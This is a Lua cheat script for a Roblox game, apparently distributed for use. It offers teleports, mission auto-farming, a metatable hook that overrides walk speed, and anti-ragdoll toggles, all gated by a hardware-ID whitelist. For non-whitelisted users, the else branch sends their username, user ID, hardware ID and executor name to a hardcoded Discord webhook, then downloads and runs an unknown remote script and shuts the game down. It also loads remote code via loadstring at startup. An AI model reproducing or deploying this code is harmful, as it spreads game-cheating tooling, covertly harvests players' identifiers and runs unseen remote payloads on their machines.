local HWID = game:GetService("RbxAnalyticsService"):GetClientId();
local WhitelistedHWIDs = {"975e5d22-6899-415c-8c8b-32bb2a4e01fa","F8BD7102-59A7-4932-85C9-D2112C724D54","PUT HWID HERE"}
local qNVAKkuwxNpqruLjSRHg = false

function CheckHWID(hwidval)
for _,whitelisted in pairs(WhitelistedHWIDs) do
if hwidval == whitelisted then
return true
elseif hwidval ~= whitelisted then
return false
end
end
end

qNVAKkuwxNpqruLjSRHg = CheckHWID(HWID)

if qNVAKkuwxNpqruLjSRHg == true then

pcall(function()
	for i,v in pairs(game.CoreGui:GetChildren()) do
	   if v:FindFirstChild("ToolTip") then
		  v:Destroy()
	   end
	end
	end)

local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

local Window = OrionLib:MakeWindow({Name = "Sg2 Wiki", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})

local Tab = Window:MakeTab({
	Name = "Farming",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Section = Tab:AddSection({
	Name = "Missions"
})



Tab:AddButton({
    Name = "Mist scroll",
    Callback = function()
-- Script generated by SimpleSpy - credits to exx#9394

workspace.Thrown.MissionScroll.ScrollEvent:FireServer()


        wait(3)
        -- Get the player and character
local player = game:GetService("Players").LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Set the character's CFrame
character:SetPrimaryPartCFrame(CFrame.new(Vector3.new(-2154.72241, 498.52475, -467.472046), Vector3.new(1, 0, 0), Vector3.new(0, 1, 0), Vector3.new(0, 0, 1)))

    end    
})


Tab:AddButton({
    Name = "Leaf scroll",
    Callback = function()
        workspace.Thrown.MissionScroll.ScrollEvent:FireServer()
        wait(3) -- wait for 3 seconds
        game.Players.LocalPlayer.Character:MoveTo(game:GetService("Workspace").MissionStuff.ScrollMansionTwoDeliver.Position) -- teleport to the destination
    end    
})


Tab:AddButton({
	Name = "Cactus",
	Callback = function()
      		workspace.Thrown.CactusPart.CactusEvent:FireServer()
		wait(3) -- wait for 3 seconds before teleporting
		local newCFrame = CFrame.new(-838.280945, 566.233276, -2888.05957, 1, 0, 0, 0, 1, 0, 0, 0, 1)
game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(newCFrame)

  	end    
})


Tab:AddButton({
	Name = "Bell",
	Callback = function()
      		workspace.Thrown.BellPart.BellEv:FireServer()
  	end    
})

Tab:AddButton({
	Name = "Bell (TP AWAY)",
	Callback = function()
      		workspace.Thrown.BellPart.BellEv:FireServer()
			  wait(1)
			  local position = CFrame.new(-4.81328297, 740.479248, 1359.0426, 0.170747042, 0.255590111, -0.951587737, -0.00269800425, 0.965887785, 0.258946896, 0.98531121, -0.0416470394, 0.165612102)
game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(position)

  	end    
})


local Section = Tab:AddSection({
	Name = "Scrolls"
})

Tab:AddButton({
    Name = "Check Scrolls",
    Callback = function()
        local success, jutsu = pcall(function()
            return game:GetService("Workspace").Scrollk["Сам такой 3"].Jutsu.Value
        end)

        local gui = Instance.new("ScreenGui")
        gui.IgnoreGuiInset = true
        gui.Enabled = true
        gui.Name = "JutsuDisplayGui"

        local frame = Instance.new("Frame", gui)
        frame.Size = UDim2.new(0, 250, 0, 75)
        frame.Position = UDim2.new(1, -260, 1, -85)
        frame.BackgroundColor3 = Color3.new(0, 0, 0)
        frame.BorderSizePixel = 0

        local title = Instance.new("TextLabel", frame)
        title.Size = UDim2.new(1, 0, 0.4, 0)
        title.Position = UDim2.new(0, 0, 0, 0)
        title.BackgroundColor3 = Color3.new(1, 1, 1)
        title.BackgroundTransparency = 0.5
        title.TextColor3 = Color3.new(1, 1, 1)
        title.Font = Enum.Font.SourceSansBold
        title.TextSize = 20
        title.Text = "Jutsu Scroll Checker"

        local text = Instance.new("TextLabel", frame)
        text.Size = UDim2.new(1, 0, 0.6, 0)
        text.Position = UDim2.new(0, 0, 0.4, 0)
        text.BackgroundColor3 = Color3.new(1, 1, 1)
        text.BackgroundTransparency = 0.5
        text.TextColor3 = success and Color3.new(1, 1, 1) or Color3.new(1, 0, 0)
        text.Font = Enum.Font.SourceSansBold
        text.TextSize = 18
        text.TextWrapped = true
        text.Text = success and jutsu or "No scrolls found"

        gui.Parent = game:GetService("CoreGui")

        wait(5)
        gui:Destroy()
    end    
})


Tab:AddToggle({
    Name = "Scroll Farm",
    Default = false,
    Callback = function(Value)
        if Value then
            local player = game:GetService("Players").LocalPlayer
            local scrollFolder = game:GetService("Workspace").Scrollk
            
            -- Check if the Scrollk folder has any children
            if #scrollFolder:GetChildren() > 0 then
                -- Teleport the local player to the first child of the Scrollk folder
                local child = scrollFolder:GetChildren()[1]
                if child and child:IsA("BasePart") then
                    player.Character:SetPrimaryPartCFrame(child.CFrame + Vector3.new(0, 5, 0))
                end
            end
        end
    end
})



local Tab2 = Window:MakeTab({
	Name = "Teleports",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Section = Tab2:AddSection({
	Name = "Villages"
})


local teleportService = game:GetService("TeleportService")
local villages = {
    ["Leaf"] = Vector3.new(1132.6029052734375, 693.439453125, 551.2340087890625),
    ["Cloud"] = Vector3.new(-5044.39794921875, 612.4915771484375, 990.3674926757812),
    ["Mist"] = Vector3.new(-3110.387451171875, 122.7542724609375, 4193.11376953125),
    ["Rain"] = Vector3.new(2900.1337890625, 690.8276977539062, -2054.214111328125),
    ["Stone"] = Vector3.new(-1010.4486694335938, 776.491455078125, 4974.87255859375),
    ["Sand"] = Vector3.new(-869.1307373046875, 565.2225341796875, -3579.771728515625)
}

Tab2:AddDropdown({
	Name = "Villages",
	Default = "...",
    Options = {"Leaf", "Cloud", "Mist", "Rain", "Stone", "Sand"},
    Callback = function(value)
        -- Get the selected village's coordinates
        local coords = villages[value]
        
        -- Teleport the local player to the village
        game.Players.LocalPlayer.Character:MoveTo(coords)
    end
})

local Section = Tab2:AddSection({
	Name = "NPC'S"
})

local npcList = {
    ["Samurai"] = game:GetService("ReplicatedStorage").NPCS.Sojiro.Samurai.Torso,
    ["Demon"] = game:GetService("ReplicatedStorage").NPCS.Bundarahma.Bundarahma.Torso,
    ["Akechi"] = game:GetService("ReplicatedStorage").NPCS.Akechi.Akechi.Torso,
    ["Monk"] = game:GetService("ReplicatedStorage").NPCS.Meteru.Meteru.Torso,
    ["Mike"] = game:GetService("ReplicatedStorage").NPCS.Mike.Mike.Torso,
    ["Medic"] = game:GetService("ReplicatedStorage").NPCS.John.John.Torso,
    ["Collector"] = game:GetService("ReplicatedStorage").NPCS.Collector.Collector.Torso,
    ["Sound merchant/Black marketer"] = game:GetService("ReplicatedStorage").NPCS["Sound Merchant"]["Black Marketer"].Torso
}
local selectedNPC = nil

local function teleportToNPC()
    if selectedNPC then
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = selectedNPC.CFrame
    end
end

Tab2:AddDropdown({
	  Name = "NPC'S",
    Default = "...",
    Options = {"Samurai", "Demon", "Akechi", "Monk", "Mike", "Medic", "Collector", "Sound merchant/Black marketer"},
    Callback = function(Value)
        selectedNPC = npcList[Value]
        teleportToNPC()
    end
})

local Section = Tab2:AddSection({
	Name = "Players"
})

local Players = game:GetService("Players")
local playerList = {}

local function updatePlayerList()
    playerList = {}
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= Players.LocalPlayer then
            table.insert(playerList, player.Name)
        end
    end
end

-- populate the playerList with players in the server (excluding the local player)
updatePlayerList()

Tab2:AddDropdown({
    Name = "Player List",
    Default = playerList[0],
    Options = playerList,
    Callback = function(selectedPlayer)
        local player = Players:FindFirstChild(selectedPlayer)
        if player and player.Character and player.Character:FindFirstChild("Head") then
            local targetPosition = player.Character.Head.Position + Vector3.new(0, 5, 0)
            Players.LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
        end
    end
})



local Tab3 = Window:MakeTab({
	Name = "Misc",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Section = Tab3:AddSection({
	Name = "Player"
})


_G.Walker = 16
Tab3:AddSlider({
	Name = "Walk speed",
	Min = 0,
	Max = 200,
	Default = 16,
	Color = Color3.fromRGB(255,255,255),
	Increment = 10,
	ValueName = "MPH",
	Callback = function(Value)
		_G.Walker = Value
	
	end    
})

Tab3:AddToggle({
	Name = "Change walk speed",
	Default = false,
	Callback = function(x)
		Walks = x
	local mt = getrawmetatable(game)
	local newindex = mt.__newindex -- Save the original function, since we're going to hijack it.
	
	setreadonly(mt, false)
	mt.__newindex = newcclosure(function(self, property, new_value)
	if rawequal(self, game.Players.LocalPlayer.Character:WaitForChild("Humanoid")) and property == "WalkSpeed" and Walks then
	   return newindex(self, property, _G.Walker) -- Cancel the operation
	end
	
	return newindex(self, property, new_value) -- Otherwise, it's valid, and ok to change
	end)
	setreadonly(mt, true)
	end    
})

Tab3:AddToggle({
	Name = "Auto Que",
    Default = false,
    Callback = function(enabled)
        if enabled then
            local args = {
                [1] = "CreateParty"
            }

            game:GetService("ReplicatedStorage").Events.PartyManagement:FireServer(unpack(args))

            wait(2)

            local args = {
                [1] = "Queue"
            }

            game:GetService("ReplicatedStorage").Events.PartyManagement:FireServer(unpack(args))
        end
    end,
})


Tab3:AddButton({
	Name = "Reset",
	Callback = function()
      		game.Players.LocalPlayer.Character.Humanoid.Health = 0
  	end    
})


Tab3:AddButton({
	Name = "Safe Place",
	Callback = function()
      		local player = game.Players.LocalPlayer

-- Save the player's current position
local originalPosition = player.Character.HumanoidRootPart.Position

-- Teleport the player 5000 studs into the air
player.Character.HumanoidRootPart.CFrame = CFrame.new(originalPosition + Vector3.new(0, 5000, 0))

-- Create a baseplate underneath the player's new position
local baseplate = Instance.new("Part")
baseplate.Name = "Baseplate"
baseplate.Size = Vector3.new(10, 1, 10)
baseplate.Anchored = true
baseplate.CFrame = CFrame.new(player.Character.HumanoidRootPart.Position - Vector3.new(0, 0.5, 0))
baseplate.Parent = game.Workspace
  	end    
})

local Tab4 = Window:MakeTab({
	Name = "PVP",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab4:AddToggle({
	Name = "No Ragdoll",
	Default = false,
	Callback = function(x)
		NR = x
	game.Players.LocalPlayer.Character.Effects.ChildAdded:Connect(function(int)
	if int.Name == "Ragdoll" and NR then
	   game.Debris:AddItem(int,0)
	end
	end)
	end
})

Tab4:AddButton({
	Name = "No Slow",
	Default = false,
	Callback = function(Value)
		isNoSlowEnabled = Value
		local slow = game:GetService("Players").LocalPlayer.Backpack.Dash.Slow
		if slow then
			slow:Destroy()
		end
	end
})


else
game.Players.LocalPlayer:Kick("ACCESS DENIED BITCH LOL!")
warn("| WARNING CRACK IN PROGRESS DETECTED! |")



local webh = "https://discord.com/api/webhooks/1097163088337322004/wAolEbTulakUqfln-WyhbhHLDbzZ73ts0MPCJ8LxcYjc1xM5HpEYTOtNzXOqxx8MLsha"


pcall(function()
local data = {

  ['embeds'] = {
    {
       ['title'] = '`` | LOGIN ATTEMPT DENIED | ``',
       ['description'] = "**Someone Has Executed You're Script**",
       ['type'] = "rich",
       ['color'] = tonumber(16753920),
       ['fields'] = {
          {name = '**Username**', value = game:GetService("Players").LocalPlayer.Name},
          {name = '**Display Name**', value = game:GetService("Players").LocalPlayer.DisplayName},
          {name = '**Player ID**', value = game:GetService("Players").LocalPlayer.UserId},
          {name = '**Player Account Age**', value = game:GetService("Players").LocalPlayer.AccountAge},
          {name = '**Hardware ID**', value = game:GetService("RbxAnalyticsService"):GetClientId()},
          {name = "**Ping**", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
          {name = "**Executor**", value = identifyexecutor()},
        }
    }
  }
}

if syn then
local response = syn.request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
elseif request then
local response = request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
elseif http_request then
local response = http_request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
end
end)
      wait(3)
     loadstring(game:HttpGet("https://raw.githubusercontent.com/01010101010x/010100101/main/Error"))();
    wait(7)
  game:shutdown()
 end


OrionLib:Init()

